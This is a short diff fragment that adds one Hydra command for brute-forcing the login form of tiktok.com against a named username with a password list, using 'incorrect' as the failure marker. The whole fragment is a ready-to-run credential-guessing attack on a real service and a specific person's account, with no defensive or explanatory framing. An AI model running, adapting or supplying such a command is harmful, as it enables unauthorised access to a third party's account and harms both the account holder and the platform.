@@ -1,0 +1,5 @@
+hydra -l shi.1430 -P
+/path/to/password/list.txt tiktok.com
+https-post-form "/
+login:username=^USER^&password=^PASS^:
+F=incorrect"
